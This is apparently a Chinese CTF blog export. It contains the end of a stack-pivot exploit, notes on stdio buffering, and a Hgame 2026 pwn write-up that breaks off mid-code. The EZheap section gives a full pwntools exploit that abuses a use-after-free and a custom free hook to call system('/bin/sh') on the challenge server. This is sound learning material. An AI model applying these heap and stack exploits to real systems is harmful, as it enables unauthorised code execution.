class="built_in">str</span>(ans).encode())</span><br><span class="line">rsp = stack - <span class="number">0x50</span></span><br><span class="line"><span class="comment">#success(hex(rsp))</span></span><br><span class="line"><span class="comment">#success(hex(stack))</span></span><br><span class="line">leave = <span class="number">0x80493C3</span></span><br><span class="line">sys = <span class="number">0x80490b0</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(sys) + p32(<span class="number">0</span>) + p32(rsp+<span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pl = pl.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(rsp) + p32(leave)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这是我师傅写的脚本。而我之所以打不通，是因为没有考虑缓冲区的问题。</p>
<p>我们进ida里可以发现main函数并没有初始化标准输入输出。而符号表中却有着init函数。同时在RDCTF函数中，有着fflush(stdout)。它刷新了缓冲区。所以导致我在打远端，等到第十次随机数绕过后，就没有了回显。所以第一次我们要先回到main函数，重新触发下fflush，来泄露出我们的栈地址。后面就是正常栈迁移的打法了。如果有不懂，可以看我别的文章里有讲。</p>
<h1 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h1><p>缓冲区（buffer）分为三种类型：全缓冲，行缓冲和不带缓冲</p>
<h2 id="1-全缓冲"><a href="#1-全缓冲" class="headerlink" title="1.全缓冲"></a>1.全缓冲</h2><p>在这种情况下，当填满标准I&#x2F;O缓存后，才进行实际I&#x2F;O操作。这里的I&#x2F;O可以理解为结构体。专门放我们写入的数据。典型代表是对磁盘文件的读写。</p>
<h2 id="2-行缓冲"><a href="#2-行缓冲" class="headerlink" title="2.行缓冲"></a>2.行缓冲</h2><p>在这种情况下，当在输入和输出中遇到换行符(<code>&#39;\n&#39;</code>)时，执行真正的I&#x2F;O操作。这是，我们输入的字符先存放在缓冲区，等按下回车键换行时才进行实际的I&#x2F;O操作。典型代表是键盘输入数据。</p>
<h2 id="3-不带缓冲"><a href="#3-不带缓冲" class="headerlink" title="3.不带缓冲"></a>3.不带缓冲</h2><p>不进行缓冲，标准出错情况stderr是典型代表，这使得出错信息可以直接尽快地显示出来。</p>
<h2 id="4-缓冲区的刷新"><a href="#4-缓冲区的刷新" class="headerlink" title="4.缓冲区的刷新"></a>4.缓冲区的刷新</h2><ul>
<li><p>缓冲区满时。</p>
</li>
<li><p>关闭文件。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>Hgame2026</title>
    <url>/2026/02/07/Hgame2026/</url>
    <content><![CDATA[<h1 id="Hgame-2026"><a href="#Hgame-2026" class="headerlink" title="Hgame 2026"></a>Hgame 2026</h1><p>第一周的Hgame pwn的部分题解。花了一周的大部分时间在写。也确实难度很高。万幸的是还好没爆零。还是需要不断学习的。</p>
<h2 id="1-EZheap"><a href="#1-EZheap" class="headerlink" title="1.EZheap"></a>1.EZheap</h2><p>真的ez吗？😂快被虐哭了😢其实是自己菜。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+4h] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        gift();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是经典的菜单函数。然后这里的delete函数里存在UAF漏洞。也是我们后面能够getshell的关键。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *mem; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;There are only 16 pages in this notebook.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mem = notes[index];</span><br><span class="line">    <span class="keyword">if</span> ( mem )</span><br><span class="line">      <span class="built_in">free</span>(mem);                                <span class="comment">// uaf</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Page not found.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，这次做题还提醒了我，千万不要刻板印象。进ida分析可以知道，这里出题人自己重定义了malloc，free函数。也就是说我们不能按照ptmalloc2和glibc的方式来理解堆块的分配。估计这也是为什么我们不能从gdb里动态调试堆块。不过幸好，在代码审计分析的时候，我们可以从add函数里读出。敏感的发现我们所创立的堆块的地址都被存入了notes[]数组。而且notes在bss段。所以我们仍然可以跟踪到我们堆块分配的地址和输入的数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index_1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 index_2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+4h] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;There are only 16 pages in this notebook.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( notes[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;This page has been used.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;size);</span><br><span class="line">    index_1 = index;</span><br><span class="line">    v1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">    index_2 = index;</span><br><span class="line">    size_1 = size;</span><br><span class="line">    notes[index_1] = v1;</span><br><span class="line">    note_size[index_2] = size_1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，这里应该怎么getshell呢？我们可以看出程序给了一个gift函数。里面是往hook的位置存入一个地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;give me a hook\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;hook) &lt;= <span class="number">0</span> )  <span class="comment">// 输入</span></span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时我们再去看一下重定义的free函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">free</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">  malloc_chunk *p; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  malloc_chunk *p_1; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  mchunkptr fd; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( hook )</span><br><span class="line">  &#123;</span><br><span class="line">    hook(mem);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( mem )</span><br><span class="line">  &#123;</span><br><span class="line">    p = (malloc_chunk *)((<span class="type">char</span> *)mem - <span class="number">16</span>);</span><br><span class="line">    v2 = *((_QWORD *)mem - <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFFEL</span>L;</span><br><span class="line">    p_1 = (malloc_chunk *)((<span class="type">char</span> *)mem + v2 - <span class="number">16</span>);</span><br><span class="line">    v4 = p_1-&gt;mchunk_size &amp; <span class="number">0xFFFFFFFFFFFFFFFEL</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( (*((_QWORD *)mem - <span class="number">1</span>) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *((_QWORD *)mem - <span class="number">2</span>);</span><br><span class="line">      p = (malloc_chunk *)((<span class="type">char</span> *)p - v5);</span><br><span class="line">      v2 += v5;</span><br><span class="line">      <span class="keyword">if</span> ( (p-&gt;mchunk_size &amp; <span class="number">0xFFFFFFFFFFFFFFFEL</span>L) != v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Libc : %s\n&quot;</span>, <span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      unlink_chunk(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( main_arena.top == p_1 )</span><br><span class="line">    &#123;</span><br><span class="line">      main_arena.top = p;</span><br><span class="line">      p-&gt;mchunk_size = (v4 + v2) | <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (*((_BYTE *)&amp;p_1-&gt;mchunk_size + v4) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        p_1-&gt;mchunk_size &amp;= ~<span class="number">1uLL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 += v4;</span><br><span class="line">        unlink_chunk(p_1);</span><br><span class="line">      &#125;</span><br><span class="line">      fd = main_arena.bins[<span class="number">0</span>];</span><br><span class="line">      main_arena.bins[<span class="number">0</span>] = p;</span><br><span class="line">      p-&gt;bk = (malloc_chunk *)&amp;completed_0;</span><br><span class="line">      p-&gt;fd = fd;</span><br><span class="line">      fd-&gt;bk = p;</span><br><span class="line">      p-&gt;mchunk_size = v2 | <span class="number">1</span>;</span><br><span class="line">      *(INTERNAL_SIZE_T *)((<span class="type">char</span> *)&amp;p-&gt;mchunk_prev_size + v2) = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说实话，看到这么大一串我是有点头疼的。后面的哪些其实我也没有完全看懂。不过我们可以看前面很关键的。会判断hook是否为0。那么也就是我们是否有往hook处填入某些地址。如果填入了，那么就会调用hook处地址，然后再把我们要free掉的内容作为参数传给hook。那么敏锐的我们肯定能察觉的。如果此时我们能把hook处的内容写为system的地址，并且创造一个写有&#x2F;bin&#x2F;sh\x00的堆块，作为参数传给free。就可以执行system(‘&#x2F;bin&#x2F;sh\x00’)从而cat flag。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;cloud-middle.hgame.vidar.club&#x27;</span>,<span class="number">31411</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">pl</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;hook\n&#x27;</span>)</span><br><span class="line">    io.sendline(pl)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak1=u64(io.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">pie = leak1 - <span class="number">0x3808</span></span><br><span class="line">success(<span class="built_in">hex</span>(pie))</span><br><span class="line">chunk0 = pie + <span class="number">0xe010</span></span><br><span class="line">note = pie + <span class="number">0x3880</span></span><br><span class="line">hook = pie + <span class="number">0x3828</span></span><br><span class="line">puts_got = pie + elf.got.puts</span><br><span class="line">success(<span class="string">f&#x27;note:---&gt;&#x27;</span>+<span class="built_in">hex</span>(note))</span><br><span class="line">success(<span class="string">f&#x27;puts_got:&#x27;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(note-<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(puts_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(hook)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(sys))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>看一下程序保护。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/xizi/Desktop/hgame/ezheap/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    FORTIFY:    Enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>所以要做到我们上述思路的话。首先libc的基地址是一定要的。然后pie的话也需要。因为我们需要找到我们notes的地址和hook的地址。因为直接利用6的话，也就是这里的gift函数会导致程序直接退出。我也不知道为什么。（可能是我们输入的16进制太大了？）</p>
<p>解释一下exp。（写的很烂QAQ）</p>
<p>首先，我本来是没有看到malloc重定义的。所以我本来打算通过unsorted bin 来泄露libc基地址。但是发现，这样只会泄露出pie。可以通过gdb调试得到。不管堆块设置多大，创立两个堆块，并且free0后再用uaf去访问0，也就是show0。这样只会把notes处的地址，也就是我们申请的第一个堆块的地址里的内容泄露出来，也就可以得到pie了。所以这里是泄露不出libc的。那我们要怎么办呢？唯一的办法就是通过show()里的puts函数。不过我们要好好看一下show()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">void __cdecl show()</span><br><span class="line">&#123;</span><br><span class="line">  const char *s; // rdi</span><br><span class="line">  unsigned <span class="built_in">int</span> index; // [rsp+4h] [rbp-14h] BYREF</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  __printf_chk(1LL, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(1LL, <span class="string">&quot;There are only 16 pages in this notebook.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    s = notes[index];</span><br><span class="line">    <span class="keyword">if</span> ( s )</span><br><span class="line">      puts(s);                                  // 泄露libc基址</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      __printf_chk(1LL, <span class="string">&quot;Page not found.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的s其实可以理解为地址。也就是我们写入的序号，会跳到notes对应的堆块。然后会把我们创立的堆块的地址传给s。然后打印。但是，并不是说我们往堆块里写入比如puts_got再去打印，就能打印出plt的地址了。而是要把notes指向堆块的地址改成我们的puts_got的地址。所以这是一个难点。具体我是怎么实现的我其实也没有完全搞懂。算是试出来的，也是比较烂吧。哎。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(note-<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(puts_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br></pre></td></tr></table></figure>

<p><img src="/images/hgame1.png" alt="gdb"></p>
<p>可以看出，此时我们把我们建立的两个堆块的地址都改写成了noets-0x10地址的位置。那么我们就可以通过写入堆块1来把notes[0]处的地址覆盖了puts_got地址。然后用uaf来泄露libc基地址。后面写入hook是一样的。只需要再次覆盖掉notes[1]的地址为hook，然后再往1里写入system的地址。并且在chunk2里写入&#x2F;bin&#x2F;sh\x00，free掉就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys = base + libc.sym.system</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(hook)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(sys))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>其中有的具体细节我还是没能完全理解，虽然是自己写的，但是还是希望能仔细阅读官方wp后再精进吧。exp烂，勿喷QAQ。</p>
<h2 id="2-Adrift"><a href="#2-Adrift" class="headerlink" title="2.Adrift"></a>2.Adrift</h2><p>这题就是偏向于栈了。比上面一道堆题还是比较友好的😁。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rdx</span></span><br><span class="line">  __int16 n200; <span class="comment">// ax</span></span><br><span class="line">  _WORD v6[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-400h] BYREF</span></span><br><span class="line">  __int16 i; <span class="comment">// [rsp+4h] [rbp-3FCh]</span></span><br><span class="line">  _QWORD buf[<span class="number">125</span>]; <span class="comment">// [rsp+6h] [rbp-3FAh] BYREF 1018</span></span><br><span class="line">  __int64 canary; <span class="comment">// [rsp+3F0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))init_canary)(argc, argv, envp);</span><br><span class="line">  canary = ::canary;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;choose&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, v6);</span><br><span class="line">    <span class="keyword">switch</span> ( v6[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;way&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">1040uLL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;distance&gt; &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">200</span> &amp;&amp; dis[i]; ++i )</span><br><span class="line">          ;</span><br><span class="line">        v3 = (_QWORD *)((<span class="type">char</span> *)&amp;str + <span class="number">1304</span> * i);</span><br><span class="line">        *v3 = buf[<span class="number">0</span>];</span><br><span class="line">        v3[<span class="number">124</span>] = buf[<span class="number">124</span>];</span><br><span class="line">        qmemcpy(</span><br><span class="line">          (<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)(v3 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L),</span><br><span class="line">          (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">char</span> *)buf - ((<span class="type">char</span> *)v3 - ((<span class="type">unsigned</span> __int64)(v3 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L))),</span><br><span class="line">          <span class="number">8LL</span> * ((((_DWORD)v3 - (((_DWORD)v3 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">1000</span>) &amp; <span class="number">0xFFFFFFF8</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;dis[i]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;index&gt; &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, v6);</span><br><span class="line">        n200 = v6[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v6[<span class="number">0</span>] &lt;= <span class="number">0</span> )</span><br><span class="line">          n200 = -v6[<span class="number">0</span>];</span><br><span class="line">        v6[<span class="number">0</span>] = n200;</span><br><span class="line">        <span class="keyword">if</span> ( n200 &gt; <span class="number">200</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;invalid index&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;a new distance&gt; &quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;dis[v6[<span class="number">0</span>]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span 